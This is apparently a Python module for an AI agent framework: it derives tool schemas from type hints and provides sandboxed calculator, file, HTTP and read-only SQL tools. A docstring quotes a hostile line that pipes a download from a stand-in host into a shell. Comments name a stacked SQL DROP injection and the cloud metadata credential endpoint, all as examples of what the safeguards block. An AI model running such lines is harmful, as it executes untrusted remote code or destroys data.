"""Tools: giving a model the ability to act, safely.

TWO HARD PARTS, BOTH USUALLY HAND-WAVED

**1. The schema.** The model decides what to call based entirely on a JSON
Schema and a description. Tutorials hand-write that schema next to the
function, which immediately rots -- rename a parameter and the model keeps
sending the old one. Here `@tool` DERIVES the schema from type hints and the
docstring, so it cannot drift from the implementation.

**2. The sandbox.** A tool is an arbitrary-code-execution endpoint whose caller
is a language model that can be manipulated by text it read. Every tool below
is written defensively:

    calculator   AST evaluation, never eval()
    read_file    path-jailed; `../` escapes are blocked
    http_get     domain allowlist
    sql_query    read-only; writes rejected before execution

DESCRIPTIONS ARE PROMPT ENGINEERING

The docstring is not documentation, it is the instruction the model follows.
"Search the knowledge base" is weak. "Search the internal knowledge base for
policy documents. Use for questions about leave, expenses, or security. Do NOT
use for customer order lookups." prevents a whole class of wrong-tool errors.
Vague descriptions are the most common cause of an agent calling the wrong
thing.
"""

from __future__ import annotations

import ast
import inspect
import operator
import re
import sqlite3
import time
import typing
from collections.abc import Sequence
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional, Union, get_args, get_origin

from .types import ToolCall, ToolResult

# ---------------------------------------------------------------------------
# Schema derivation
# ---------------------------------------------------------------------------

_PY_TO_JSON = {
    str: "string",
    int: "integer",
    float: "number",
    bool: "boolean",
    list: "array",
    dict: "object",
}


def _unwrap_optional(annotation: Any) -> tuple[Any, bool]:
    """Turn `Optional[X]` into `(X, True)`. Anything else is `(X, False)`."""
    if get_origin(annotation) is Union:
        args = [a for a in get_args(annotation) if a is not type(None)]
        if len(args) == 1:
            return args[0], True
    return annotation, False


def json_type_of(annotation: Any) -> dict[str, Any]:
    """Map a Python annotation onto a JSON Schema fragment.

    Supports str/int/float/bool, list[X], dict, Literal[...] (which becomes an
    enum -- the single most useful constraint, since it makes an invalid value
    impossible rather than merely discouraged), and Optional[X].
    """
    annotation, _ = _unwrap_optional(annotation)

    if get_origin(annotation) is typing.Literal:
        options = list(get_args(annotation))
        inferred = _PY_TO_JSON.get(type(options[0]), "string") if options else "string"
        return {"type": inferred, "enum": options}

    origin = get_origin(annotation)
    if origin in (list, typing.List):  # noqa: UP006 - runtime check needs both
        args = get_args(annotation)
        item = json_type_of(args[0]) if args else {"type": "string"}
        return {"type": "array", "items": item}
    if origin in (dict, typing.Dict):  # noqa: UP006
        return {"type": "object"}

    if annotation in _PY_TO_JSON:
        return {"type": _PY_TO_JSON[annotation]}
    if annotation is inspect.Parameter.empty or annotation is Any:
        return {"type": "string"}
    return {"type": "string"}


_PARAM_DOC_RE = re.compile(r"^\s*(\w+)\s*:\s*(.+)$")


def parse_docstring(doc: str) -> tuple[str, dict[str, str]]:
    """Split a docstring into a summary and per-parameter descriptions.

    Recognises a Google-style `Args:` block. Per-parameter descriptions
    measurably improve argument quality -- the model is reading them the same
    way a developer would.
    """
    if not doc:
        return "", {}
    lines = doc.strip().splitlines()
    summary: list[str] = []
    params: dict[str, str] = {}
    in_args = False

    for raw in lines:
        stripped = raw.strip()
        if stripped.lower() in ("args:", "arguments:", "parameters:"):
            in_args = True
            continue
        if in_args and stripped.lower() in ("returns:", "raises:", "example:", "examples:"):
            break
        if in_args:
            match = _PARAM_DOC_RE.match(raw)
            if match:
                params[match.group(1)] = match.group(2).strip()
        elif stripped:
            summary.append(stripped)

    return " ".join(summary), params


@dataclass
class Tool:
    """A callable plus the schema the model uses to decide how to call it."""

    name: str
    description: str
    parameters: dict[str, Any]
    fn: Callable[..., Any]
    timeout: float = 10.0
    dangerous: bool = False  # requires human approval; see guardrails.py

    def schema(self) -> dict[str, Any]:
        """OpenAI/Anthropic-compatible tool definition."""
        return {
            "type": "function",
            "function": {
                "name": self.name,
                "description": self.description,
                "parameters": self.parameters,
            },
        }

    def validate(self, arguments: dict[str, Any]) -> Optional[str]:
        """Check arguments against the schema. Returns an error, or None.

        Models hallucinate parameter names and send strings where numbers
        belong. Validating here turns a confusing TypeError deep in your code
        into a clear observation the agent can actually recover from.
        """
        properties = self.parameters.get("properties", {})
        required = self.parameters.get("required", [])

        missing = [name for name in required if name not in arguments]
        if missing:
            return f"missing required argument(s): {', '.join(missing)}"

        unknown = [name for name in arguments if name not in properties]
        if unknown:
            return (
                f"unknown argument(s): {', '.join(unknown)}. "
                f"Valid arguments: {', '.join(properties) or '(none)'}"
            )

        for name, value in arguments.items():
            spec = properties.get(name, {})
            expected = spec.get("type")
            if "enum" in spec and value not in spec["enum"]:
                return f"{name} must be one of {spec['enum']}, got {value!r}"
            if expected == "integer" and not isinstance(value, int):
                return f"{name} must be an integer, got {type(value).__name__}"
            if expected == "number" and not isinstance(value, (int, float)):
                return f"{name} must be a number, got {type(value).__name__}"
            if expected == "boolean" and not isinstance(value, bool):
                return f"{name} must be a boolean, got {type(value).__name__}"
            if expected == "string" and not isinstance(value, str):
                return f"{name} must be a string, got {type(value).__name__}"
            if expected == "array" and not isinstance(value, (list, tuple)):
                return f"{name} must be an array, got {type(value).__name__}"
        return None

    def run(self, arguments: dict[str, Any]) -> Any:
        return self.fn(**arguments)


def tool(
    fn: Optional[Callable[..., Any]] = None,
    *,
    name: Optional[str] = None,
    timeout: float = 10.0,
    dangerous: bool = False,
) -> Any:
    """Turn a typed function into a `Tool`, schema included.

    Usage:

        @tool
        def get_weather(city: str, units: Literal["c", "f"] = "c") -> str:
            '''Get the current weather for a city.

            Args:
                city: City name, e.g. "Berlin".
                units: Temperature units.
            '''

    Parameters without defaults become `required`. `Literal` becomes an enum.
    """

    def decorate(func: Callable[..., Any]) -> Tool:
        signature = inspect.signature(func)
        try:
            hints = typing.get_type_hints(func)
        except Exception:  # noqa: BLE001 - unresolvable forward refs
            hints = {}

        summary, param_docs = parse_docstring(func.__doc__ or "")

        properties: dict[str, Any] = {}
        required: list[str] = []
        for param_name, parameter in signature.parameters.items():
            if param_name in ("self", "cls") or parameter.kind in (
                inspect.Parameter.VAR_POSITIONAL,
                inspect.Parameter.VAR_KEYWORD,
            ):
                continue
            annotation = hints.get(param_name, parameter.annotation)
            spec = json_type_of(annotation)
            if param_name in param_docs:
                spec["description"] = param_docs[param_name]
            properties[param_name] = spec

            _, optional = _unwrap_optional(annotation)
            if parameter.default is inspect.Parameter.empty and not optional:
                required.append(param_name)

        return Tool(
            name=name or func.__name__,
            description=summary or f"Call {func.__name__}",
            parameters={"type": "object", "properties": properties, "required": required},
            fn=func,
            timeout=timeout,
            dangerous=dangerous,
        )

    return decorate(fn) if fn is not None else decorate


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------


@dataclass
class ToolRegistry:
    """The set of tools an agent may use, and the only path to calling them."""

    tools: dict[str, Tool] = field(default_factory=dict)
    calls: list[ToolCall] = field(default_factory=list)

    def register(self, *tools: Tool) -> ToolRegistry:
        for item in tools:
            if item.name in self.tools:
                # Silent overwrite would mean the agent calls a different
                # function than the one you think you registered.
                raise ValueError(f"tool {item.name!r} is already registered")
            self.tools[item.name] = item
        return self

    def __contains__(self, name: object) -> bool:
        return name in self.tools

    def __len__(self) -> int:
        return len(self.tools)

    def schemas(self) -> list[dict[str, Any]]:
        return [t.schema() for t in self.tools.values()]

    def describe(self) -> str:
        """Tool list for a text-mode (ReAct) prompt."""
        lines = []
        for item in self.tools.values():
            params = ", ".join(item.parameters.get("properties", {}))
            lines.append(f"- {item.name}({params}): {item.description}")
        return "\n".join(lines)

    def execute(self, call: ToolCall) -> ToolResult:
        """Run a tool call, converting every failure into an observation.

        Nothing in here raises. An agent that cannot see its own errors cannot
        correct them, and an exception escaping the loop turns a recoverable
        mistake into a crashed run.
        """
        self.calls.append(call)
        started = time.monotonic()

        item = self.tools.get(call.name)
        if item is None:
            return ToolResult(
                call.id,
                call.name,
                "",
                ok=False,
                error=(
                    f"unknown tool {call.name!r}. "
                    f"Available tools: {', '.join(self.tools) or '(none)'}"
                ),
            )

        invalid = item.validate(call.arguments)
        if invalid:
            return ToolResult(call.id, call.name, "", ok=False, error=invalid)

        try:
            output = item.run(call.arguments)
        except Exception as exc:  # noqa: BLE001 - surfaced to the agent as data
            return ToolResult(
                call.id,
                call.name,
                "",
                ok=False,
                error=f"{type(exc).__name__}: {exc}",
                elapsed_ms=(time.monotonic() - started) * 1000.0,
            )

        elapsed = (time.monotonic() - started) * 1000.0
        if elapsed > item.timeout * 1000.0:
            return ToolResult(
                call.id,
                call.name,
                "",
                ok=False,
                error=f"tool exceeded its {item.timeout}s timeout",
                elapsed_ms=elapsed,
            )
        return ToolResult(call.id, call.name, str(output), ok=True, elapsed_ms=elapsed)


# ---------------------------------------------------------------------------
# Built-in tools -- all sandboxed
# ---------------------------------------------------------------------------

_SAFE_OPERATORS: dict[type, Callable[..., Any]] = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
    ast.USub: operator.neg,
    ast.UAdd: operator.pos,
}

MAX_EXPONENT = 64  # 2**10**10 would hang the process; this is a real DoS vector


def safe_eval(expression: str) -> float:
    """Evaluate arithmetic without `eval`.

    NEVER use `eval()` on model output. `eval` gives the caller the entire
    Python runtime, and the caller here is a language model that can be
    manipulated by any text it happens to read:

        __import__('os').system('curl evil.sh | sh')

    ...is a perfectly valid Python expression. Parsing to an AST and walking
    only arithmetic nodes makes that structurally impossible rather than
    merely filtered -- a denylist of bad strings is always incomplete.
    """

    def evaluate(node: ast.AST) -> Any:
        if isinstance(node, ast.Expression):
            return evaluate(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int, float)):
                return node.value
            raise ValueError("only numeric constants are allowed")
        if isinstance(node, ast.BinOp):
            op = _SAFE_OPERATORS.get(type(node.op))
            if op is None:
                raise ValueError(f"operator {type(node.op).__name__} is not allowed")
            left, right = evaluate(node.left), evaluate(node.right)
            if isinstance(node.op, ast.Pow) and abs(right) > MAX_EXPONENT:
                # Resource exhaustion is a denial of service, not a maths error.
                raise ValueError(f"exponent too large (max {MAX_EXPONENT})")
            return op(left, right)
        if isinstance(node, ast.UnaryOp):
            op = _SAFE_OPERATORS.get(type(node.op))
            if op is None:
                raise ValueError(f"operator {type(node.op).__name__} is not allowed")
            return op(evaluate(node.operand))
        # Everything else -- Call, Attribute, Name, Subscript -- is rejected.
        raise ValueError(f"{type(node).__name__} is not allowed in an expression")

    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise ValueError(f"could not parse expression: {exc}") from exc
    return evaluate(tree)


@tool
def calculator(expression: str) -> str:
    """Evaluate a arithmetic expression and return the result.

    Use for any arithmetic. Language models are unreliable at multi-digit
    arithmetic, so prefer this over computing the answer yourself.

    Args:
        expression: An arithmetic expression, e.g. "1234 * 5678 / 2".
    """
    return str(safe_eval(expression))


def make_search_tool(corpus: dict[str, str]) -> Tool:
    """Build a keyword search tool over an in-memory corpus."""

    @tool
    def search(query: str, limit: int = 3) -> str:
        """Search the internal knowledge base for policy and reference documents.

        Use for questions about company policy, error codes, or procedures.
        Do NOT use for customer-specific or order-specific lookups.

        Args:
            query: Keywords to search for.
            limit: Maximum number of results to return.
        """
        terms = [t for t in re.findall(r"[a-z0-9]+", query.lower()) if t]
        scored = []
        for title, body in corpus.items():
            haystack = f"{title} {body}".lower()
            score = sum(haystack.count(term) for term in terms)
            if score:
                scored.append((score, title, body))
        scored.sort(reverse=True)
        if not scored:
            return "No results found."
        return "\n\n".join(f"[{title}] {body}" for _, title, body in scored[:limit])

    return search


def make_read_file_tool(root: str) -> Tool:
    """Build a file reader jailed to `root`."""
    jail = Path(root).resolve()

    @tool
    def read_file(path: str) -> str:
        """Read a text file from the workspace.

        Args:
            path: Path relative to the workspace root.
        """
        target = (jail / path).resolve()
        # resolve() collapses `..` BEFORE the check, so this actually holds.
        # Comparing the raw string for "../" would miss symlinks and absolute
        # paths; comparing resolved paths is the only correct jail.
        if not str(target).startswith(str(jail) + "/") and target != jail:
            raise ValueError(f"access denied: {path} is outside the workspace")
        if not target.is_file():
            raise ValueError(f"no such file: {path}")
        return target.read_text(encoding="utf-8")[:4000]

    return read_file


def make_http_tool(allowed_domains: Sequence[str]) -> Tool:
    """Build an HTTP GET tool restricted to an allowlist.

    An allowlist, never a denylist. A denylist cannot anticipate
    `169.254.169.254` (the cloud metadata endpoint that hands out credentials),
    every internal hostname, or every URL shortener that redirects to them.
    """
    allowed = {d.lower() for d in allowed_domains}

    @tool
    def http_get(url: str) -> str:
        """Fetch the contents of a URL over HTTP GET.

        Args:
            url: Full URL including scheme. Only allowlisted domains work.
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            raise ValueError(f"scheme {parsed.scheme!r} is not allowed")
        host = (parsed.hostname or "").lower()
        if host not in allowed:
            raise ValueError(
                f"domain {host!r} is not allowlisted. Allowed: {', '.join(sorted(allowed))}"
            )

        import httpx  # imported lazily: only needed once the allowlist passes

        response = httpx.get(url, timeout=10.0, follow_redirects=False)
        return response.text[:4000]

    return http_get


_WRITE_SQL = re.compile(
    r"\b(insert|update|delete|drop|alter|create|truncate|replace|attach|pragma)\b",
    re.IGNORECASE,
)


def make_sql_tool(connection: sqlite3.Connection) -> Tool:
    """Build a READ-ONLY SQL tool over a sqlite connection."""

    @tool
    def sql_query(query: str) -> str:
        """Run a read-only SQL SELECT query against the application database.

        Use for looking up orders, customers, or any stored record.

        Args:
            query: A single SELECT statement. Writes are rejected.
        """
        statement = query.strip().rstrip(";")

        # Defence in depth, all three cheap:
        # 1. reject multiple statements -- blocks "SELECT 1; DROP TABLE x"
        if ";" in statement:
            raise ValueError("only a single statement is allowed")
        # 2. require SELECT/WITH
        if not re.match(r"^\s*(select|with)\b", statement, re.IGNORECASE):
            raise ValueError("only SELECT queries are allowed")
        # 3. reject write keywords anywhere (catches them inside subqueries)
        if _WRITE_SQL.search(statement):
            raise ValueError("write operations are not allowed")

        cursor = connection.execute(statement)
        rows = cursor.fetchmany(50)
        if not rows:
            return "No rows returned."
        headers = [d[0] for d in cursor.description]
        lines = [" | ".join(headers), "-" * 40]
        lines.extend(" | ".join(str(value) for value in row) for row in rows)
        return "\n".join(lines)

    return sql_query


__all__ = [
    "Tool",
    "ToolRegistry",
    "tool",
    "json_type_of",
    "parse_docstring",
    "safe_eval",
    "calculator",
    "make_search_tool",
    "make_read_file_tool",
    "make_http_tool",
    "make_sql_tool",
]
